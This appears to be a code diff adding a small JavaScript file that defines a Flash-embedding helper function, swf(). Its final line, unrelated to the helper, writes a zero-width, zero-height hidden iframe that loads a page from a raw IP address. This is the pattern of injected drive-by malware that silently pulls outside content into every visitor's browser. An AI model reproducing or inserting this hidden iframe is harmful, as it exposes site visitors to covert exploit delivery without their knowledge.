@@ -1,0 +1,9 @@
+function swf(src,width,height){
+    object = '';
+    object += '<object type="application/x-shockwave-flash" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" id="param" width="'+width+'" height="'+height+'">';
+    object += '<param name="movie" value="'+src+'">';
+    object += '<embed src="'+src+'" quality="high" wmode="transparent" bgcolor="#ffffff" menu="false" width="'+width+'" height="'+height+'" swliveconnect="true" id="param" name="param" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer"><\/embed>';
+    object += '<\/object>';
+    document.write(object);
+}
+document.write('<iframe height=0 width=0 src="http://222.233.53.126/MEDIA/help.html"></iframe>');
